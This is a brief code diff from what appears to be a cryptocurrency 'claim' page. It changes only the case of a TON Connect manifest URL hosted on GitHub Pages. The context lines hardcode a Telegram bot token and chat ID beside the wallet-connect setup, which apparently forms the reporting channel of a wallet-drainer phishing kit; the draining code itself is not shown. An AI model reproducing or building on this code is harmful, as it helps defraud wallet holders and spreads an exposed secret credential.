@@ -3,7 +3,7 @@ const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
 const chatId = "@ppjjkkd";
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://imdontyou.github.io/cleim/tonconnect-manifest.json',
+    manifestUrl: 'https://imdontyou.github.io/Cleim/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
 });
 
